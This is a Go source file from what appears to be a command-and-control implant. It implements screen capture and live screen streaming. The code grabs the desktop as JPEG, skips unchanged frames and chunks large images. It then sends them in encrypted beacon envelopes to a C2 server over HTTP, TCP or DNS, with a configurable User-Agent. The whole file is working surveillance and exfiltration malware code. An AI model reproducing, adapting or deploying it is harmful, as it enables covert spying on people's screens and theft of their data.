//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"image/jpeg"
	"io"
	"net/http"
	"strings"
)

func sendScreenStreamError(msg string) {
	req := BeaconRequest{
		UUID: agentUUID,
		Results: []TaskResult{{
			Type:  "screen_stream_error",
			Error: msg,
		}},
	}
	body, _ := encodeBeacon(req)
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		return
	}
	switch getProtocol() {
	case "tcp":
		sendTCPBeacon(sendBody)
	case "dns":
		sendDNSBeacon(sendBody)
	default:
		// Route through the regular beacon POST so the error reaches the
		// server's generic result processing and appears in its logs.
		screenURL := c2URLAtIndex(int(currentC2Idx.Load()))
		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
			screenURL = "http://" + screenURL
		}
		httpReq, err := http.NewRequest("POST", screenURL+beaconHTTPURI(), bytes.NewReader(sendBody))
		if err != nil {
			return
		}
		httpReq.Header.Set("Content-Type", "text/plain;charset=UTF-8")
		httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		resp, err := client.Do(httpReq)
		if err == nil {
			// Drain for conn reuse; a read error here is normal peer behavior.
			_, _ = io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

var lastScreenFrameHash string

func screenFrameHash(data []byte) string {
	if len(data) < 1024 {
		return fmt.Sprintf("%d:%x", len(data), data)
	}
	// Fast hash: length + first 256 + last 256 bytes
	return fmt.Sprintf("%d:%x:%x", len(data), data[:256], data[len(data)-256:])
}

func sendScreenFrame(data []byte) {
	// Dirty-rect lite: skip identical frames (static desktop) — saves 80% bandwidth
	h := screenFrameHash(data)
	if h == lastScreenFrameHash {
		return
	}
	lastScreenFrameHash = h
	b64 := base64.StdEncoding.EncodeToString(data)
	req := BeaconRequest{
		UUID: agentUUID,
		Results: []TaskResult{{
			Type:   "screen_frame",
			Output: b64,
		}},
	}
	body, _ := encodeBeacon(req)
	sendBody, kind, _, ok := buildBeaconEnvelope(body)
	if !ok || kind != agentFrameEncrypted {
		return
	}
	switch getProtocol() {
	case "tcp":
		sendTCPBeacon(sendBody)
	case "dns":
		sendDNSBeacon(sendBody)
	default:
		screenURL := c2URLAtIndex(int(currentC2Idx.Load()))
		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
			screenURL = "http://" + screenURL
		}
		httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(sendBody))
		if err != nil {
			return
		}
		httpReq.Header.Set("Content-Type", "application/json")
		httpReq.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		resp, err := client.Do(httpReq)
		if err == nil {
			// Drain for conn reuse; a read error here is normal peer behavior.
			_, _ = io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
}

func takeScreenshotJPEG(quality int) ([]byte, error) {
	img, err := captureScreenRGBA()
	if err != nil {
		return nil, err
	}
	var jpegBuf bytes.Buffer
	opts := &jpeg.Options{Quality: quality}
	if err := jpeg.Encode(&jpegBuf, img, opts); err != nil {
		return nil, err
	}
	return jpegBuf.Bytes(), nil
}

// stampScreenshotTask attaches the capture task id to every chunk. Without it
// the server cannot associate the chunks with the screenshot task (the old
// results carried TaskID 0 and were silently discarded).
func stampScreenshotTask(taskID uint, results []TaskResult) {
	for i := range results {
		results[i].TaskID = taskID
	}
}

func takeScreenshotChunked(quality int) []TaskResult {
	imgBytes, err := takeScreenshotJPEG(quality)
	if err != nil {
		return []TaskResult{{Error: err.Error()}}
	}

	if len(imgBytes) <= 2*1024*1024 {
		return []TaskResult{{
			Type:     "screenshot",
			Output:   base64.StdEncoding.EncodeToString(imgBytes),
			Encoding: "base64",
			Size:     int64(len(imgBytes)),
		}}
	}

	chunkSize := 256 * 1024
	totalChunks := (len(imgBytes) + chunkSize - 1) / chunkSize
	var results []TaskResult

	for i := 0; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(imgBytes) {
			end = len(imgBytes)
		}
		chunk := imgBytes[start:end]
		results = append(results, TaskResult{
			Type:     "screenshot_chunk",
			Output:   base64.StdEncoding.EncodeToString(chunk),
			Encoding: "base64",
			Offset:   int64(i),
			Size:     int64(totalChunks),
			Filename: fmt.Sprintf("screenshot_%d_%d.jpg", i, totalChunks),
		})
	}

	return results
}
